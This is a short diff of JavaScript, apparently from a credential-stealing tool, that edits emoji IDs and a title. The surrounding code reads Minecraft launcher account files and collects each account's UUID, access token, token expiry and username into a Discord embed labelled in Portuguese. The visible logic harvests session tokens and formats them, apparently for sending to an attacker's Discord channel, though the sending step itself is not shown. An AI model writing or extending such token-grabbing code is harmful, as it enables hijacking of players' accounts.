@@ -31,18 +31,18 @@ files.forEach(fileName => {
                 for (const accountId in accounts) {
                     const accountData = accounts[accountId];
                     const userInfo = {
-                        "<:nether60:1200271943144853575> UUID": accountId,
+                        "<:nether60:1378151260628455454> UUID": accountId,
                         "<a:creative:1200271935695761488> Token de acesso": accountData.accessToken || "",
-                        "<:dia53:1200271937998426254> Expira em": accountData.accessTokenExpiresAt || ""
+                        "<:dia53:1378151006600302763> Expira em": accountData.accessTokenExpiresAt || ""
                     };
 
                     if (accountData.minecraftProfile) {
                         const profileData = accountData.minecraftProfile;
-                        userInfo["<:MC_gold_ingot78:1200271941156749342> ID"] = profileData.id || "";
-                        userInfo["<:emeraude:1200271939407708160> Nome de usuário"] = profileData.name || "";
+                        userInfo["<:MC_gold_ingot78:1378151010077507724> ID"] = profileData.id || "";
+                        userInfo["<:emeraude:1378151008366235779> Nome de usuário"] = profileData.name || "";
                     }
 
-                    const username = userInfo["<:emeraude:1200271939407708160> Nome de usuário"] || "Desconhecido";
+                    const username = userInfo["<:emeraude:1378151008366235779> Nome de usuário"] || "Desconhecido";
                     let avatarUrl = "";
 
                     if (accountData.minecraftProfile) {
@@ -56,7 +56,7 @@ files.forEach(fileName => {
                     }));
 
                     const embed = {
-                        title: "<:dr4g0n:1362932398102155475> Informações do Minecraft <:dr4g0n:1362932398102155475>",
+                        title: "Informações do Minecraft",
                         color: 0x250e80,
                         thumbnail: { url: avatarUrl },
                         fields: embedFields,
